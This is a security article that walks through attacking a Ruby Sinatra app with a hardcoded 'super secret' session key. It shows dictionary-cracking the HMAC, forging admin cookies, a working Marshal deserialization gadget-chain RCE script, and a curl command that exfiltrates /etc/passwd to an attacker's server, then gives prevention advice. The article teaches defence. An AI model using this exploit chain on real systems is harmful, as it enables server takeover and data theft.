---
title: "One Line of Code that Compromises Your Server"
description: "A session secret is a key used for encrypting cookies. Application developers often set     it to a weak key during development, and don't fix it during production. This article     explains how such "
date: 2017-04-03T00:00:00
tags: ["security"]
url: https://martinfowler.com/articles/session-secret.html
slug: session-secret
word_count: 4953
---


I was recently taking a quick look at a small Ruby web application built on
    Sinatra. As I scanned through the configuration code I came across this line:


```
set :session_secret, 'super secret'
```


Uh oh. Chances are the string 'super secret' isn't actually that much of a
    secret.


Even though it is quite obvious that this is a mistake when I pull that line out
    alone in a post about the importance of secrets, it's an extremely common type of
    mistake to make. It's easy to do. After all, it's just one line of code among many,
    and once it was written there was likely little reason to revisit that part of the
    code again.


What's more, it's a mistake that has no immediate impact for either users or
    developers. The app still works fine, sessions still hold state, deployments continue
    without a hitch.


An attacker, however, could likely use this flaw to log in as any user in the
    system, and even gain shell access to the server it’s running on.


Let’s explore how that is possible, tracing through the steps an attacker could
    take.


But first, what exactly is this session secret?


## What is a session secret?


The session secret is a key used for signing and/or encrypting cookies set by the
      application to maintain session state.


In practice, this is often what prevents users from pretending to be someone
      they’re not -- ensuring that random person on the internet cannot access your
      application as an administrator.


Cookies are the most common way for web applications to persist state (like the
      currently logged in user) across distinct HTTP requests. To achieve this, web
      browsers will hang on to pieces of information that a web server wants to remember,
      dutifully sending it back with each subsequent request to remind the server that,
      for example, we are still logged in -- and possibly also that we are or are not an
      admin.


But because these cookies are stored by the web browser (the client), the web
      server doesn't actually know that the cookies it receives from the client are
      legitimate. This guarantee is not provided by the [cookie spec](https://tools.ietf.org/html/rfc6265), which states:


> A malicious client could alter the Cookie header before transmission, with
>         unpredictable results


Well that sounds bad. Later on, the spec gives us some advice:


> Servers SHOULD encrypt and sign the contents of cookies (using whatever format
>         the server desires) when transmitting them to the user agent


This advice wasn’t exactly followed, and web frameworks are just now starting to
      encrypt cookies by default. Sinatra (and the lower level framework, Rack) do,
      however, sign cookies by default. This means that while clients
      can read the contents of a cookie, they shouldn't be able to change
      the value in any way.


Many other frameworks offer functionality to do the same
      thing. For example, Node/Express has a `secret` parameter,
      Python/Django has a `SECRET_KEY` parameter, and Java/Play has a
      `crypto.secret` parameter. While they may use slightly different algorithms under the hood,
      the basic functionality is the same and they are prone to the same attacks I'm about to describe
      in the context of Ruby/Sinatra.


Looking at the Rack code around cookie management we see:


class Rack::Session::Cookie


```
  def write_session(req, session_id, session, options)
    session = session.merge("session_id" => session_id)
    session_data = coder.encode(session)
  
    if @secrets.first
      session_data << "--#{generate_hmac(session_data, @secrets.first)}"
    end
  
    # â¦
```


[source](https://github.com/rack/rack/blob/95172a60fe5c2a3850163fc75e0981fe440c064e/lib/rack/session/cookie.rb#L158)


```
  def generate_hmac(data, secret)
    OpenSSL::HMAC.hexdigest(@hmac.new, secret, data)
  end
```


[source](https://github.com/rack/rack/blob/95172a60fe5c2a3850163fc75e0981fe440c064e/lib/rack/session/cookie.rb#L184)


```
  def initialize(app, options={})
    @secrets = options.values_at(:secret, :old_secret).compact
    @hmac = options.fetch(:hmac, OpenSSL::Digest::SHA1)
    # â¦
```


[source](https://github.com/rack/rack/blob/95172a60fe5c2a3850163fc75e0981fe440c064e/lib/rack/session/cookie.rb#L108)


Rack will first encode the session data in some way, then (in its default
      configuration) use OpenSSL to generate the HMAC-SHA1 of the session secret and the session
      data, and append that HMAC to the encoded session data separated by '--'.


In math-y terms, the application returns a cookie value of `(data, hmac)` where `hmac =
      hmac-sha1(secret, data)`


By making a request to our application, we can see the result:


```
$ curl -v http://192.168.50.50:9494/
(...)
< Set-Cookie:
rack.session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiRTdhYTliNGY5ZjVmOTE4MjIxYTU5%0AMGM4OGI1Y
TdjMzA3Y2QxNTYyYmJjZGQwYTEyNjJmOThhNmVlNmQzM2ExMTEG%0AOwBGSSIJY3NyZgY7AEZJIiU2M2ZjZTF
kZGIxNTc1ZmU4YzM0Y2YyZjc2M2Vl%0AMGMwYQY7AEZJIg10cmFja2luZwY7AEZ7B0kiFEhUVFBfVVNFUl9BR
0VOVAY7%0AAFRJIi1lZjE4YWVkMjg0YWI3NWU3MGEwMWIyMmUzMWI5MGU3YmE0NDcwYzc2%0ABjsARkkiGUhU
VFBfQUNDRVBUX0xBTkdVQUdFBjsAVEkiLWRhMzlhM2VlNWU2%0AYjRiMGQzMjU1YmZlZjk1NjAxODkwYWZkOD
A3MDkGOwBG%0A--b64eac9e0a5fb41a12b58a7ffe97c51b73fbf1a6;
path=/; HttpOnly

```


So if we know that:


```
data = BAh...%0A
```


and:


```
hmac = b64...1a6
```


Then in order to tamper with the session data, we need to find a secret where


```
hmac-sha1(secret, BAh...%0A) = b64...1a6
```


By design, there is no way to mathematically calculate secret in this equation. In
      order to find it, we'll just have to keep guessing until we find the right value...


## How to crack a weak session secret


So “super secret” isn't cryptographically secure random data... but would an
      attacker really be able to take advantage of this without access to the source
      code?


While SHA1 isn't reversible, it is, unfortunately in this case, extremely fast
      (as a general purpose hash function, it was designed to be). This isn't a problem if
      the secret is suitably long cryptographically secure random data, but “super secret”
      definitely isn't. Let's see how long it would take an attacker to guess it.


Instead of making completely random guesses resulting in a brute force attack, we
      can try our luck at a dictionary attack. The dictionary attack gets it's name from
      trying every word in a dictionary, but in reality the dictionary is only the start.
      Taylor Hornby writes this about his CrackStation list:


> The list contains every wordlist, dictionary, and password database leak that I
>         could find on the internet (and I spent a LOT of time looking). It also contains
>         every word in the Wikipedia databases (pages-articles, retrieved 2010, all
>         languages) as well as lots of books from Project Gutenberg. It also includes the
>         passwords from some low-profile database breaches that were being sold in the
>         underground years ago.
> -- [Taylor Hornby](https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm)


Wow, that sounds like a lot of data. The full CrackStation list contains almost
      1.5 billion entries in a single 15 gigabyte file.


SHA1 is fast, but with that much data, let's make sure we're calculating those
      hashes as fast as possible. [Hashcat](https://hashcat.net/hashcat/)
      is a program to do exactly that. Written in
      highly optimized C, and taking advantage of both CPUs and GPUs, Hashcat will fly
      through SHA1. The GPU support is key as GPU's can compute hashes much faster than
      CPU's can. My laptop doesn't have a GPU, but it would be a shame not to take
      advantage of this support...


At the end of 2013 Amazon launched [GPU instances](https://aws.amazon.com/ec2/instance-types/#g2) as
      part of it's EC2 offering. For just $2.60 an hour, we can rent a g2.8xlarge
      instance with:

- 4 GPUs
- 32 vCPUs
- 60G of memory


With the CrackStation wordlist, Hashcat, and our giant EC2 instance, we have a
      fairly respectable hashing setup for very little effort and astonishingly little
      cost.


### The dictionary attack


Let's try this out with some sample data:


gen-cookie.rbâ¦


```
  require 'base64'
  require 'openssl'
  
  key = 'super secret'
  cookie_data = 'test'
  cookie = Base64.strict_encode64(Marshal.dump(cookie_data)).chomp
  digest = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new('SHA1'), key, cookie)
  puts("#{cookie}--#{digest}")

```


```
$ ruby gen-cookie.rb 
BAhJIgl0ZXN0BjoGRVQ=--8c5ae09ed57f1e933cc466f5b99ea636d1fc31a2

```


Hashcat is mainly designed for cracking password hashes, which often include a password
        and a salt instead of data and key. But as people sometimes use HMAC-SHA1 in password
        storage schemes, it is supported by the program. Pretending that our session data is a
        password salt, we convert our cookie value into the âhash:saltâ format that Hashcat
        expects:


```
$ echo '8c5ae09ed57f1e933cc466f5b99ea636d1fc31a2:BAhJIgl0ZXN0BjoGRVQ=' > hashes 

```


And then run Hashcat with our new one-line hashes file, the crackstation wordlist, and
        the '-m150' option, telling it to use HMAC-SHA1 (the full list of supported algorithms can
        be seen by typing `'hashcat -h'`):


```
$ hashcat -m150 hashes ~/wordlists/crackstation.txt
(...)
8c5ae09ed57f1e933cc466f5b99ea636d1fc31a2:BAhJIgl0ZXN0BjoGRVQ=:super secret
Session.Name...: hashcat
Status.........: Cracked
Input.Mode.....: File (/home/ec2-user/wordlists/crackstation.txt)
Hash.Target....: 8c5ae09ed57f1e933cc466f5b99ea636d1fc31a2:...
Hash.Type......: HMAC-SHA1 (key = $pass)
Time.Started...: Wed Aug 17 21:45:08 2016 (43 secs)
Speed.Dev.#1...: 6019.4 kH/s (12.95ms)
Speed.Dev.#2...: 5714.5 kH/s (13.04ms)
Speed.Dev.#3...: 5626.1 kH/s (13.20ms)
Speed.Dev.#4...: 6096.9 kH/s (13.24ms)
Speed.Dev.#*...: 23456.9 kH/s
Recovered......: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.......: 1021407839/1196843344 (85.34%)
Rejected.......: 6826591/1021407839 (0.67%)
Restore.Point..: 1017123528/1196843344 (84.98%)
Started: Wed Aug 17 21:45:08 2016
Stopped: Wed Aug 17 21:46:04 2016

```


Wow! In just 43 seconds we blasted through over a billion hashes and, 85.34% of the way
        through the list, correctly guessed 'super secret'.


### Caveats


There is unfortunately (or fortunately?) a caveat with using Hashcat in this
        way: as it's really designed for use with passwords, and password salts tend to be
        quite short, it doesn't accept âsaltsâ longer than 55 characters, which rack
        session data will usually surpass.


However, this doesn't mean though that other programs, or even custom software,
        won't be able to handle longer payloads.


### Impact


This experiment clearly shows that dictionary attacks against Rack session
        secrets are well within the realm of possibility. A session secret that is not
        sufficiently cryptographically random can be guessed with fairly little time,
        effort and resources.


This attack is not limited to Rack secrets, and many web frameworks require a
        session secret in their default configuration in order to operate securely. These all work very similarly
        to our `:session_secret`, and can also be guessed in a similar ways.


Next, let’s explore the harm an attacker could cause after guessing this
        secret.


## Taking control of the application


So now we have a session secret... what does that win us? The first and most
      obvious thing to do is to attempt to spoof an administrator's session.


The application has a `/manage` path that should only be accessed by admins.
      Requesting it without a cookie simply redirects us to a login page:


```
$ curl -v http://192.168.50.50:9494/manage
* Hostname was NOT found in DNS cache
* Trying 192.168.50.50...
* Connected to 192.168.50.50 (192.168.50.50) port 9494 (#0)
> GET /manage HTTP/1.1
> User-Agent: curl/7.35.0
> Host: 192.168.50.50:9494
> Accept: */*
>
< HTTP/1.1 302 Found
< Location: http://192.168.50.50:9494/login
(...)

```


Okay, but now we know the session secret, we can create a cookie with any value we want
      and the application will trust it.


Let’s create a cookie with some common admin flags set to true, signed with HMAC-SHA1
      using the key ‘super secret’, and send it to the web server to see if it’s accepted:


gen-cookie-2.rbâ¦


```
  require 'base64'
  require 'openssl'
  
  key = 'super secret'
  
  cookie_data = {
    :authorized => true,
    :authorised => true,
    :admin => true,
    :loggedin => true
  }
  
  cookie = Base64.strict_encode64(Marshal.dump(cookie_data)).chomp
  digest = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new('SHA1'), key, cookie)
  
  puts("#{cookie}--#{digest}")
```


running this…


```
$ curl -v http://192.168.50.50:9494/manage --cookie "rack.session=$(ruby gen-cookie-2.rb)"
* Hostname was NOT found in DNS cache
* Trying 192.168.50.50...
* Connected to 192.168.50.50 (192.168.50.50) port 9494 (#0)
> GET /manage HTTP/1.1
> User-Agent: curl/7.35.0
> Host: 192.168.50.50:9494
> Accept: */*
> Cookie: rack.session=BAh7CToPYXV0aG9yaXNlZFQ6D2F1dGhvcml6ZWRUOgphZG1pblQ6DWxvZ2dlZGluVA==--a3b1d4402b7345022f50a82671c17fa2b3b174e3
>
< HTTP/1.1 200 OK
< Content-Type: text/html;charset=utf-8
< Content-Length: 2746
(...)

```


200 OK! In this case, the application was looking for the âauthorisedâ flag to be set.
      It's also very common to see apps use an âadminâ flag. Sometimes it's a user id instead of
      a simple flag, in which case you can try low values like 0 or 1 — these will often be the
      administrators.


### Impact


Any administration functionality exposed by the application could be accessed
        by the attacker. In addition, they could likely also impersonate any other user of
        your application. Large amounts of sensitive data would likely be exposed, and any
        dangerous admin-only functions would likely be abused.


Sadly, the story doesn’t stop here. In the next section, we’ll show how an
        attacker could use this to escalate to remote code execution with no additional
        vulnerabilities.


## Taking control of the server


At this point we have achieved control over the app... but we can actually take
      this further to gain control of the server.


If we go back to the cookie handling code in Rack, we see the following methods
      for encoding and decoding cookies:


class Rack::Session::Cookieâ¦


```
  def initialize
    # snipâ¦ 
  
    @coder = options[:coder] ||= Base64::Marshal.new
    # â¦
```


[source](https://github.com/rack/rack/blob/95172a60fe5c2a3850163fc75e0981fe440c064e/lib/rack/session/cookie.rb#L119)


```
  # Encode session cookies as Marshaled Base64 data
  class Marshal < Base64
    def encode(str)
      super(::Marshal.dump(str))
    end
  
    def decode(str)
      return unless str
      ::Marshal.load(super(str)) rescue nil
    end
  end
```


[source](https://github.com/rack/rack/blob/95172a60fe5c2a3850163fc75e0981fe440c064e/lib/rack/session/cookie.rb#L60)


```

```


By default Rack uses `Marshal.dump` and `Marshal.load` to serialize and deserialize data.
      This is convenient for developers, as it allows saving arbitrary Ruby objects in the
      session, but unfortunately, it also means that attackers can abuse this functionality to
      trick the application into executing arbitrary code by instantiating objects with cleverly chosen values.


This is possible using a technique that Stefan Esser dubbed [
      property oriented programming](https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf) in the context of PHP `unserialize()` vulnerabilities back in 2010.


When we control the input to either PHP's `unserialize()` or Ruby's `Marshal.load()` we can
      tell the app to load any class that we want, along with any properties that we want.
      Neither Ruby nor PHP allow serializing code, so the trick is to choose classes and
      property values that, when interacted with as usual by the application, will end up
      executing the code of our choosing.


In our case the first thing that Rack does with the de-serialized session data is an
      array lookup:


class Rack::Session::Cookieâ¦


```
  def extract_session_id(request)
    unpacked_cookie_data(request)["session_id"]
  end
```


[source](https://github.com/rack/rack/blob/95172a60fe5c2a3850163fc75e0981fe440c064e/lib/rack/session/cookie.rb#L132)


So how do we turn a simple array lookup into something interesting?


In 2013 Charlie Somerville found a magical class in the Rails ActiveSupport gem called
      DeprecationProxy. Even though the app in question was built on Sinatra, it pulled in
      ActiveSupport as a dependency.


DeprecationProxy is magical because it has two things that are really useful to us... a
      `method_missing` method, and a call to `.__send__()` that we can completely control.


The `method_missing` means that any call, including our `session_id` lookup, will trigger
      the code path we want:


class ActiveSupport::Deprecation::DeprecationProxy


```
  def method_missing(called, *args, &block)
    warn caller_locations, called, args
    target.__send__(called, *args, &block)
  end

```


[source](https://github.com/rails/rails/blob/b326e82dc012d81e9698cb1f402502af1788c1e9/activesupport/lib/active_support/deprecation/proxy_wrappers.rb#L23)


Ignore the `__send__` call above, the call we're interested in happens before that even
      executes, in the target method:


class ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy


```
  def target
    @instance.__send__(@method)
  end

```


[source](https://github.com/rails/rails/blob/b326e82dc012d81e9698cb1f402502af1788c1e9/activesupport/lib/active_support/deprecation/proxy_wrappers.rb#L98)


Wow! Because both `@instance` and `@method` are instance variables, we can control their
      values after de-serialization, allowing us to call any method on any object (as long as
      the method can be called without parameters).


What method should we execute? On Rails apps we can create an ERB template, but this
      application is using Sinatra with Slim templates, and doesn't pull in ERB.


Luckily, I found the `Temple::ERB::Template` class in the Temple library that Slim is
      built on.


```
  module Temple
    # ERB example implementation
    #
    # Example usage:
    #   Temple::ERB::Template.new { "<%= 'Hello, world!' %>" }.render
    #
    module ERB
      # ERB Template class
      Template = Temple::Templates::Tilt(Engine)
    end
  end
```


[source](https://github.com/judofyr/temple/blob/6c51f84abee7e3b43e0d283464eb2c976e7fa4e9/lib/temple/erb/template.rb)


This class acts just like a Rails ERB template, and lets us serialize a string that,
      when render is called, will be eval'd by the template.


### Executing a command on the server


Okay, let's put it all together:


gen-cookie-rce.rbâ¦


```
  require 'base64'
  require 'openssl'
  require 'temple'
  
  @key = 'super secret'
  @payload = ARGV.join ' '
  
  def gen_cookie_with_digest(cookie_data)
    cookie = Base64.strict_encode64(Marshal.dump(cookie_data)).chomp
    digest = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new('SHA1'), @key, cookie)
    "#{cookie}--#{digest}"
  end
  
  class ActiveSupport
    class Deprecation
      class DeprecatedInstanceVariableProxy
        def initialize(i, m)
          @instance = i
          @method = m
        end
      end
    end
  end
  
  erb = Temple::ERB::Template.new { "<% #{@payload} %>" }
  cookie_data = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :render
  
  puts gen_cookie_with_digest(cookie_data)
```


But when we run it...


```
$ ruby gen-cookie-rce.rb
gen-cookie-rce.rb:14:in `dump': no _dump_data is defined for class Proc (TypeError)
from gen-cookie-rce.rb:14:in `gen_cookie_with_digest'
from gen-cookie-rce.rb:41:in `<main>

```


Hmm, a Proc is code, so can't be serialized... but our payload is a string. Where is
        that Proc coming from?


```
$ irb
2.2.2 :001 > require 'temple'
=> true
2.2.2 :002 > t = Temple::ERB::Template.new { "<% puts 'test' %>" }
=> #<Temple::ERB::Template:0x000000010ced00 @options={}, @line=1, @file=nil,
@compiled_method={}, @default_encoding=nil, @reader=<Proc:0x000000010cecd8@(irb):2>,
@data="<% puts 'test' %>", @src="_buf = []; puts 'test' ; _buf << (\"\".freeze);
_buf = _buf.join"

```


Okay, Template gets initialized with a Proc for the `@reader` instance variable... but
        we can change that. While we're at it, let's set the `@src` property directly too:


```
2.2.2 :010 > t = Temple::ERB::Template.new { "" }
=> #<Temple::ERB::Template:0x0000000117e8e0 @options={}, @line=1,
@file=nil, @compiled_method={}, @default_encoding=nil,
@reader=#<Proc:0x0000000117e890@(irb):10>, @data="", @src="_buf = \"\"">
2.2.2 :011 > t.instance_variable_set(:@reader, nil)
=> nil

2.2.2 :012 > t.instance_variable_set(:@src, "puts 'test'")
=> "puts 'test'"

2.2.2 :013 > Marshal.dump(t)
=> "\x04\bo:\x1ATemple::ERB::Template\r:\r@options{\x00:\n@linei\x06:\n@file0:
\x15@compiled_method{\x00:\x16@default_encoding0:\f@reader0:\n@dataI\"
\x00\x06:\x06ET:\t@srcI\"\x10puts 'test'\x06;\rT"
2.2.2 :014 > Marshal.load(Marshal.dump(t)).render
test

```


Looks good.


After updating our script:


gen-cookie-rce.rb...


```
  erb = Temple::ERB::Template.new { "" }
  erb.instance_variable_set :@reader, nil
  erb.instance_variable_set :@src, @payload
```


We can now generate payloads successfully:


```
$ ruby gen-cookie-rce.rb 'puts test'
BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQ
cm94eQg6DkBpbnN0YW5jZW86GlRlbXBsZTo6RVJCOjpUZW1wbGF0ZQ06DUBvcHRpb25zewA6CkBsaW5l
aQY6CkBmaWxlMDoVQGNvbXBpbGVkX21ldGhvZHsAOhZAZGVmYXVsdF9lbmNvZGluZzA6DEByZWFkZXIw
OgpAZGF0YUkiAAY6BkVUOglAc3JjSSIOcHV0cyB0ZXN0BjsPVDoMQG1ldGhvZDoLcmVuZGVyOhBAZGVw
cmVjYXRvcm86GEJ1bmRsZXI6OlVJOjpTaWxlbnQGOg5Ad2FybmluZ3NbAA==--ab97c627274697118a
8c17a411917b0e35759200

```


While we could try to print a line on the remote server too, we likely
        won't see the output in the response we get back. So how can we tell if we've been
        successful?


A common strategy when testing 'blind' like this is to execute a sleep or wait for a
        few seconds. If the server hangs for a while when we do so, we know we're able to execute
        commands.


Let's use backticks to shell out from Ruby and execute the sleep command:


```
$ curl -v http://192.168.50.50:9494/ --cookie "rack.session=$(ruby gen-cookie-rce.rb '`sleep 2`')"
* Hostname was NOT found in DNS cache
* Trying 192.168.50.50...
* Connected to 192.168.50.50 (192.168.50.50) port 9494 (#0)
> GET / HTTP/1.1
> User-Agent: curl/7.35.0
> Host: 192.168.50.50:9494
> Accept: */*
> Cookie: rack.session=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRl
ZEluc3RhbmNlVmFyaWFibGVQcm94eQc6DkBpbnN0YW5jZW86GlRlbXBsZTo6RVJCOjpUZW1wbGF0ZQ0
6DUBvcHRpb25zewA6CkBsaW5laQY6CkBmaWxlMDoVQGNvbXBpbGVkX21ldGhvZHsAOhZAZGVmYXVsdF
9lbmNvZGluZzA6DEByZWFkZXIwOgpAZGF0YUkiAAY6BkVUOglAc3JjSSIOYHNsZWVwIDJgBjsPVDoMQ
G1ldGhvZDoLcmVuZGVy--125155123857318baac81efb24c2c630bb5cf610
>
< HTTP/1.1 500 Internal Server Error
< Content-Type: text/plain
< Content-Length: 6435
* Server WEBrick/1.3.1 (Ruby/2.2.2/2015-04-13) is not blacklisted
< Server: WEBrick/1.3.1 (Ruby/2.2.2/2015-04-13)
< Date: Fri, 19 Aug 2016 00:13:43 GMT
< Connection: Keep-Alive
<
NoMethodError: private method `warn' called for nil:NilClass
/home/vagrant/.rvm/gems/ruby-2.2.2/gems/activesupport-4.2.4/lib/active_support/deprecation/proxy_wrappers.rb:92:in `warn'
/home/vagrant/.rvm/gems/ruby-2.2.2/gems/activesupport-4.2.4/lib/active_support/deprecation/proxy_wrappers.rb:23:in `method_missing'
(...)

```


Ah. If we take a look at the warn method the stacktrace is pointing us to, we see what
        is happening:


class DeprecatedInstanceVariableProxyâ¦


```
  def warn(callstack, called, args)
    @deprecator.warn(
      "#{@var} is deprecated! Call #{@method}.#{called} instead of #{@var}.#{called}. Args: #{args.inspect}",
      callstack)
  end
```


[source](https://github.com/rails/rails/blob/b326e82dc012d81e9698cb1f402502af1788c1e9/activesupport/lib/active_support/deprecation/proxy_wrappers.rb#L102)


`warn` wants to call `@deprecator.warn()`, but we haven't specified any value for the
        field, so it's left as `nil`.


I had a look around for classes defining warn methods and found
        `Bundler::UI::Silent`:


class Bundler::UI::Silentâ¦


```
  def warn(message, newline = nil)
  end
```


[source](https://github.com/bundler/bundler/blob/master/lib/bundler/ui/silent.rb#L15)


So we add a silent logger to our proxy:


gen-cookie-rce.rb...


```
  class DeprecatedInstanceVariableProxy
    def initialize(i, m)
      @instance = i
      @method = m
      @deprecator = Bundler::UI::Silent.new
    end
  end
```


And trying again:


```
$ curl -v http://192.168.50.50:9494/ --cookie "rack.session=$(ruby ./gen-cookie-rce.rb '`sleep 2`')"
* Hostname was NOT found in DNS cache
* Trying 192.168.50.50...
* Connected to 192.168.50.50 (192.168.50.50) port 9494 (#0)
> GET / HTTP/1.1
> User-Agent: curl/7.35.0
> Host: 192.168.50.50:9494
> Accept: */*
> Cookie: rack.session=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6R
GVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQg6DkBpbnN0YW5jZW86GlRlbXBsZ
To6RVJCOjpUZW1wbGF0ZQ06DUBvcHRpb25zewA6CkBsaW5laQY6CkBmaWxlMDoVQGNvb
XBpbGVkX21ldGhvZHsAOhZAZGVmYXVsdF9lbmNvZGluZzA6DEByZWFkZXIwOgpAZGF0Y
UkiAAY6BkVUOglAc3JjSSIOYHNsZWVwIDJgBjsPVDoMQG1ldGhvZDoLcmVuZGVyOhBAZ
GVwcmVjYXRvcm86GEJ1bmRsZXI6OlVJOjpTaWxlbnQGOg5Ad2FybmluZ3NbAA==--f15
c54bf271f0b3aee1c589fa40869abade262c4
> 


```


I waited for 6 seconds then…


```
< HTTP/1.1 500 Internal Server Error 
< Content-Type: text/plain
< Content-Length: 6298
* Server WEBrick/1.3.1 (Ruby/2.2.2/2015-04-13) is not blacklisted
< Server: WEBrick/1.3.1 (Ruby/2.2.2/2015-04-13)
< Date: Fri, 19 Aug 2016 00:13:43 GMT
< Connection: Keep-Alive
< 
IndexError: string not matched
        /home/vagrant/.rvm/gems/ruby-2.2.2/gems/activesupport-4.2.4/lib/active_support/deprecation/proxy_wrappers.rb:24:in `[]='
        /home/vagrant/.rvm/gems/ruby-2.2.2/gems/activesupport-4.2.4/lib/active_support/deprecation/proxy_wrappers.rb:24:in `method_missing'


```


Wohoo! That wait was pretty long... it turns out our command is being executed three
        times. But one time or three, a shell is a shell.


You can also see that we still got an error back from the app, but we don't care about
        that as our command has already executed.


### Getting data from the server


A shell is a shell? Well not quite. Right now we can execute a command, but we can't even see the result.
        However, we can get around this trivially by sending data over to a webserver we
        control.


First, we set up a simple python http server on a box with a publicly routable
        IP:


```
$ cd $(mktemp -d)
$ python3 -mhttp.server
Serving HTTP on 0.0.0.0 port 8000 ...

```


Then see if we can call curl on the compromised host:


```
$ curl -v http://192.168.50.50:9494/ --cookie "rack.session=$(ruby gen-cookie-rce.rb '`curl http://our-python-server:8000`')"

```


And switching back to our python server:


```
127.0.0.1 - - [18/Aug/2016 17:40:47] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [18/Aug/2016 17:40:47] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [18/Aug/2016 17:40:48] "GET / HTTP/1.1" 200 -

```


Nice. Can we include some actual data?


```
$ curl -v http://192.168.50.50:9494/ --cookie "rack.session=$(ruby gen-cookie-rce.rb '`curl http://our-python-server:8000?$(cat /etc/passwd | base64 -w0)`')"

127.0.0.1 - - [18/Aug/2016 17:50:26] "GET /?cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1" 200 -
127.0.0.1 - - [18/Aug/2016 17:50:27] "GET /?cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1" 200 -
127.0.0.1 - - [18/Aug/2016 17:50:28] "GET /?cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1" 200 -

$ echo cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgo= | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

```


### Impact


In this example we are only exfiltrating the `/etc/passwd` file from the server. This
        actually isn’t because the passwd file is particularly sensitive -- it’s usually not --
        but because it’s generally a world readable file that exists on every linux server.
        We’re just proving that we can execute arbitrary commands and read the result.


From here, an attacker would likely first determine what external systems the
        application has access to. Databases, internal web services, and backup systems can all
        be valuable targets.


They would then use the same information and credentials that the application uses to
        explore these services. For example, the database that the application is using could
        contain valuable data such as username/password information, PII, and credit card
        information.


Again, these types of attacks are not Rack or Ruby specific. Deserialization is a
        complex task, and can often be exploited when untrusted data is accepted. [
        Such a vulnerability](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/) was found in the (Java) Apache Commons Collections library in 2015,
        affecting products such as WebLogic, WebSphere, JBoss, and Jenkins. However, frameworks
        that do not use object serialization are less susceptible to
        attacks like this. For example, with the 4.1 release Rails
        switched the default serialization mechanism from [Marshal to JSON](http://guides.rubyonrails.org/upgrading_ruby_on_rails.html#cookies-serializer), mitigating the RCE portion
        of this attack and limiting the damange to forged
        sessions.


## Prevention


We've demonstrated how an attacker could feasibly gain full shell access to a web
      server due to a single (though critical) line of configuration code. Now, what can
      we do to prevent this type of vulnerability from happening again?


### For application developers


The first step is awareness. One of the secure delivery principles we highlight
        in [AppSec101](https://www.thoughtworks.com/insights/blog/appsec101-welcoming-all-roles-world-security) (Thoughtworks’ application security training course) is âKeep Secrets
        Secretâ. It sounds obvious, but is more difficult than it sounds. A lot of time is
        spent creating secret management tools and strategies, some of which are discussed
        by Daniel Somerfield in his AppSecUSA talk [âTurtles All the Way Down: Storing
        Secrets in the Cloud and the Data Centerâ](https://www.youtube.com/watch?v=OUSvv2maMYI). In particular, Hashicorp Vault is a
        promising secret management server with good support for account management and
        auditing. It can take some work to set up however, and simple solutions are still
        much better than nothing at all. Sensitive configuration values can be specified
        as environment variables at application start time, and provided to CI tools as
        protected fields. Jetbrains TeamCity, for example, supports
        [hidden password parameters](https://confluence.jetbrains.com/display/TCD9/Typed+Parameters). For
        long term storage, password managers like 1Password and pass have
        functionality to enable teams to securely store and share
        secrets. Email, IMs, wikis, and sticky notes have no place in our
        secret management strategy!


What should we have done instead of copying and pasting ‘super secret’
        then?


Before starting down this path, if you have any security specialists available
        to help you, you should ask them. Decisions about key generation and management
        are largely dependent on your situation and the level of security required by your
        organization and application. Don’t be afraid to ask for help!


But in case you don’t have a specialist to talk to, here are some simple steps
        we can take to get an application up and running.


We need to generate the key using a Cryptographically Secure Pseudo Random
        Number Generator, or CSPRNG. We can do this on unix systems by reading data from
        `/dev/urandom` and encoding with base64 so that we end up with printable ASCII
        characters:


```
$ head -c20 /dev/urandom | base64
Xe005osOAE8ZRMDReizQJjlLrrs=

```


Here we are generating a 20 byte, or 160 bit key. What key size you should be using is
        a great question for your security specialist. I’m choosing 20 bytes because that is how
        long SHA-1 is, and having a longer secret isn’t going to help us. If we thought that 160
        bits was not secure enough, we would need to replace SHA-1 as well as increasing the
        length of the session secret.


Next, instead of adding this secret to the source code, we’ll reference it dynamically
        through an environment variable.


```
set :session_secret, ENV.fetch('SESSION_SECRET') { SecureRandom.hex(20) } 
```


This will try to pull the session secret in from an environment variable, and just in
        case we forget to specify one, will generate it dynamically when the environment variable
        is missing.


Finally, we must specify this environment variable when the application starts up:


```
SESSION_SECRET=’Xe005osOAE8ZRMDReizQJjlLrrs=’ ruby sinatra-app.rb -p 8080 
```


If you’re wondering where to keep the secret in order to specify it when starting up
        the app, then you’ve hit the ‘turtles all the way down’ problem and should check out
        Daniel’s talk. There are a number of different strategies depending on your level of
        automation, maturity of your operations team, and required level of security. If you
        just need to get something in place quickly, consider setting up a team password manager
